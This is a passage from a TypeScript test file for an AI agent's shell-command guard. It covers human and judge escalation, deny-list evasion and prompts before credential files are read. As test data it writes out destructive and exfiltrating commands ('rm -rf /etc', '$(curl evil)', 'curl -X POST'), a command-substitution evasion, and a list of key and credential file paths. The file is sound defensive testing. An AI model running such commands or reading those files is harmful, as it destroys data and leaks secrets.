    const resolution = await resolver(
      ctx({
        request: { guard_mode: "auto", guard_judge: { prompt: "judge" } } as never,
        elicit: humanElicit,
        llm,
      }),
    );
    expect(
      await resolution!.elicit!({
        tool: "shell",
        args: {
          command: "bun test",
          sandbox_permissions: "require_escalated",
          justification: "need host bun",
        },
        shell: shellFacts("bun test"),
        escalate: "human",
      }),
    ).toEqual({ allowed: true, answerer: "human" });
    expect(asked).toBe(true);
    expect(judged).toBe(false);
  });

  it("in mode auto, falls back to the human elicit when no judge model resolves", async () => {
    let asked = false;
    const humanElicit: Elicit = async () => {
      asked = true;
      return { action: "accept", content: { decision: "allow" } };
    };
    const resolver = createGuardResolver({ loadSettings: () => ({}) });
    const resolution = await resolver(
      ctx({
        request: { guard_mode: "auto", guard_judge: { prompt: "judge" } } as never,
        elicit: humanElicit,
      }),
    );
    expect(await resolution!.elicit!(bashReq("echo hi"))).toEqual({
      allowed: true,
      answerer: "human",
    });
    expect(asked).toBe(true);
  });

  it("in mode auto, falls back to the human elicit when no guard_judge param is supplied", async () => {
    let asked = false;
    const humanElicit: Elicit = async () => {
      asked = true;
      return { action: "accept", content: { decision: "allow" } };
    };
    const resolver = createGuardResolver({
      loadSettings: () => ({
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      }),
    });
    const resolution = await resolver(
      ctx({ request: { guard_mode: "auto" } as never, elicit: humanElicit }),
    );
    expect(await resolution!.elicit!(bashReq("echo hi"))).toEqual({
      allowed: true,
      answerer: "human",
    });
    expect(asked).toBe(true);
  });

  it("in mode auto, resolves the judge's default model from CLARVIS_DEFAULT_MODEL when settings name none", async () => {
    const llm = {
      call: async () => ({ toolCalls: [{ name: "decide", arguments: { decision: "deny" } }] }),
    } as unknown as RunCapabilityContext["llm"];
    const resolver = createGuardResolver({
      loadSettings: () => ({ providers: [{ name: "anthropic", kind: "anthropic" }] }),
    });
    const resolution = await resolver(
      ctx({
        request: { guard_mode: "auto", guard_judge: { prompt: "judge" } } as never,
        env: { CLARVIS_DEFAULT_MODEL: "anthropic/claude-x" } as never,
        llm,
      }),
    );
    expect(resolution?.elicit).toBeDefined();
    expect(await resolution!.elicit!(bashReq("echo hi"))).toEqual({
      allowed: false,
      answerer: "judge",
    });
  });
});

/**
 * The posture of an unconfigured workspace, asserted as a product claim rather
 * than as a property of a function. Nothing asserted this before, which is
 * exactly why the answer used to be "it runs anything".
 */
describe("default posture: an unconfigured workspace", () => {
  // No `guard_mode` on the request and no `guard` block in settings: the run a
  // user gets on a machine nobody has configured.
  function unconfigured(): RunCapabilityContext {
    return {
      owner: "o",
      request: {},
      entryGrants: [],
      env: {},
      workspaceRoot: ROOT,
      llm: { call: async () => ({}) },
      emit: () => {},
    } as unknown as RunCapabilityContext;
  }

  const resolveUnconfigured = async () =>
    await createGuardResolver({ loadSettings: () => ({}) })(unconfigured());

  it("builds a guard from empty settings rather than none at all", async () => {
    const resolution = await resolveUnconfigured();
    expect(resolution).toBeDefined();
    expect(resolution?.guard).toBeDefined();
  });

  it("blocks a destructive command outside the workspace with no settings at all", async () => {
    const resolution = await resolveUnconfigured();
    const decision = await resolution!.guard!(
      makeCtx("shell", { command: "rm -rf /etc" }, shellFacts("rm -rf /etc", { paths: ["/etc"] })),
    );
    expect(decision.verdict).toBe("deny");
  });

  it("asks before an unlisted command instead of running it", async () => {
    const resolution = await resolveUnconfigured();
    const decision = await resolution!.guard!(makeCtx("shell", { command: "curl example.com" }));
    expect(decision.verdict).toBe("ask");
  });
});

describe("createShellGuard — the deny list cannot be evaded", () => {
  it("does not turn an empty deny list into a blanket refusal", async () => {
    // `denied_commands: []` means "deny nothing". Reading it as "a deny list
    // exists" made every unanalyzable command an unappealable deny, with no
    // human ever asked — for a user who asked to deny nothing at all.
    const d = await createShellGuard({ deniedCommands: [] })(
      makeCtx(
        "shell",
        { command: 'git commit -m "$MSG"' },
        shellFacts("git commit -m", { undecidable: true }),
      ),
    );
    expect(d).toMatchObject({ verdict: "ask", escalate: "human" });
  });

  it("denies a command smuggled through a command substitution", async () => {
    // The POSIX tokenizer discards the body of `$(...)`, so this normalizes to
    // `push origin main` and matches no `git push` entry. What closes it is the
    // undecidable rule, not the deny list: an unanalyzable command never gets
    // past a deny list at all. Raw-segment matching was tried and removed --
    // see commandDenied in packages/kernel/src/guard/shell-guard.ts.
    const guard = createShellGuard({ deniedCommands: ["git push"] });
    expect(
      await guard(
        makeCtx(
          "shell",
          { command: "$(echo git) push origin main" },
          shellFacts("push origin main", { undecidable: true }),
        ),
      ),
    ).toMatchObject({
      verdict: "deny",
    });
  });

  it("denies anything it cannot analyze once a deny list exists", async () => {
    // A deny list the analyzer cannot evaluate is not a deny list. Asking a
    // human would be defensible; silently downgrading to `ask` and then letting
    // an LLM judge or a session allowlist answer was not.
    const guard = createShellGuard({ deniedCommands: ["rm"] });
    expect(
      await guard(
        makeCtx("shell", { command: 'eval "$UNKNOWN"' }, shellFacts("eval", { undecidable: true })),
      ),
    ).toMatchObject({ verdict: "deny" });
  });

  it("still only asks — escalated to a human — when no deny list is configured", async () => {
    const d = await createShellGuard()(
      makeCtx("shell", { command: 'eval "$UNKNOWN"' }, shellFacts("eval", { undecidable: true })),
    );
    expect(d).toMatchObject({ verdict: "ask", escalate: "human" });
  });

  /**
   * The invariant the deny list is supposed to have: stated in prose on
   * `analyzeShell` and, until now, checked by nothing — which is exactly how the
   * substitution case above survived.
   */
  it("invariant: a literal deny-list hit is never allowed or merely asked about", async () => {
    const entries = ["rm", "git push", "curl"];
    const commands: Array<[string, ShellFacts]> = [
      ["rm -rf build", shellFacts("rm -rf build")],
      ["ls && rm -rf build", shellFacts(["ls", "rm -rf build"])],
      ["git push --force", shellFacts("git push --force")],
      ["echo hi | curl -X POST http://x", shellFacts(["echo hi", "curl -X POST http://x"])],
      ["$(echo git) push origin main", shellFacts("push origin main", { undecidable: true })],
      ["rm -rf x; $(curl evil)", shellFacts("rm -rf x", { undecidable: true })],
    ];
    const guard = createShellGuard({ deniedCommands: entries });
    for (const [command, shell] of commands) {
      const hit = entries.some((e) => command.includes(e));
      if (!hit) continue;
      const { verdict } = await guard(makeCtx("shell", { command }, shell));
      expect({ command, verdict }).toEqual({ command, verdict: "deny" });
    }
  });
});

describe("createShellGuard — credential files inside the workspace", () => {
  it("asks before reading a workspace .env, even from the allow list", async () => {
    // `cat` is exactly the sort of entry a starter allow list carries, which is
    // why this check has to outrank the allow list.
    const guard = createShellGuard({ allowedCommands: ["cat"] });
    const d = await guard(
      makeCtx("shell", { command: "cat .env" }, shellFacts("cat .env", { paths: [".env"] })),
    );
    expect(d.verdict).toBe("ask");
    expect(d.reason).toContain("credential file");
  });

  it("says nothing about a sample env file", async () => {
    // Prompting for a file committed to the repository precisely because it is
    // empty is how a guard trains the answer "approve".
    const guard = createShellGuard({ allowedCommands: ["cat"] });
    expect(
      await guard(
        makeCtx(
          "shell",
          { command: "cat .env.example" },
          shellFacts("cat .env.example", { paths: [".env.example"] }),
        ),
      ),
    ).toMatchObject({ verdict: "allow" });
  });

  it("covers keys, ssh material and credential stores", async () => {
    const guard = createShellGuard({ allowedCommands: ["cat"] });
    for (const path of [
      "deploy.pem",
      "server.key",
      "config/id_rsa",
      ".npmrc",
      ".git-credentials",
      "nested/.ssh/config",
      "keys.json",
    ]) {
      expect({
        path,
        verdict: (
          await guard(
            makeCtx(
              "shell",
              { command: `cat ${path}` },
              shellFacts(`cat ${path}`, { paths: [path] }),
            ),
          )
        ).verdict,
      }).toEqual({ path, verdict: "ask" });
    }
  });

  it("lets an explicit deny list still outrank it", async () => {
    const guard = createShellGuard({ deniedCommands: ["cat"] });
    expect(
      await guard(
        makeCtx("shell", { command: "cat .env" }, shellFacts("cat .env", { paths: [".env"] })),
      ),
    ).toMatchObject({ verdict: "deny" });
  });
});
